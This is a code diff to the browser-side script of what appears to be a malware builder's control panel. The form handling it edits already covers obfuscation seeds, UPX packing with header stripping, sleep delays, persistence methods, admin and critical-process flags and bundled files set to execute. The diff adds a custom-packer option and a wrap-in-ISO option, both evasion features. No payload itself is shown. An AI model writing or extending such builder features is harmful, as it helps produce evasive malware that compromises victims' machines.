@@ -149,6 +149,8 @@ function collectFormSettings() {
     garbleSeed: document.getElementById("garble-seed")?.value ?? "",
     enableUpx: document.querySelector('input[name="enable-upx"]')?.checked ?? false,
     upxStripHeaders: document.querySelector('input[name="upx-strip-headers"]')?.checked ?? false,
+    useCustomPacker: document.querySelector('input[name="use-custom-packer"]')?.checked ?? false,
+    wrapInISO: document.querySelector('input[name="wrap-in-iso"]')?.checked ?? false,
     sleepSeconds: document.getElementById("sleep-seconds")?.value ?? "0",
     enablePersistence: document.querySelector('input[name="enable-persistence"]')?.checked ?? false,
     persistenceMethods: Array.from(document.querySelectorAll('input[name="persistence-method"]:checked')).map((el) => el.value),
@@ -214,6 +216,8 @@ function applyFormSettings(settings) {
   if (settings.garbleSeed !== undefined) setVal("garble-seed", settings.garbleSeed);
   if (settings.enableUpx !== undefined) setCb('input[name="enable-upx"]', settings.enableUpx);
   if (settings.upxStripHeaders !== undefined) setCb('input[name="upx-strip-headers"]', settings.upxStripHeaders);
+  if (settings.useCustomPacker !== undefined) setCb('input[name="use-custom-packer"]', settings.useCustomPacker);
+  if (settings.wrapInISO !== undefined) setCb('input[name="wrap-in-iso"]', settings.wrapInISO);
   if (settings.sleepSeconds !== undefined) setVal("sleep-seconds", settings.sleepSeconds);
   if (settings.enablePersistence !== undefined) setCb('input[name="enable-persistence"]', settings.enablePersistence);
   if (Array.isArray(settings.persistenceMethods)) {
@@ -326,6 +330,7 @@ const CRYPTABLE_DISABLE_TARGETS = [
   'input[name="enable-persistence"]',
   'input[name="enable-upx"]',
   'input[name="upx-strip-headers"]',
+  'input[name="use-custom-packer"]',
   'input[name="require-admin"]',
   'input[name="critical-process"]',
 ];
@@ -1431,6 +1436,8 @@ form?.addEventListener("submit", async (e) => {
     iconBase64: pendingIconBase64 || undefined,
     enableUpx: form.querySelector('input[name="enable-upx"]')?.checked || false,
     upxStripHeaders: form.querySelector('input[name="upx-strip-headers"]')?.checked || false,
+    useCustomPacker: form.querySelector('input[name="use-custom-packer"]')?.checked || false,
+    wrapInISO: form.querySelector('input[name="wrap-in-iso"]')?.checked || false,
     boundFiles: boundFiles.length > 0
       ? boundFiles.map((f) => ({ name: f.name, data: f.base64, targetOS: f.targetOS, execute: f.execute }))
       : undefined,
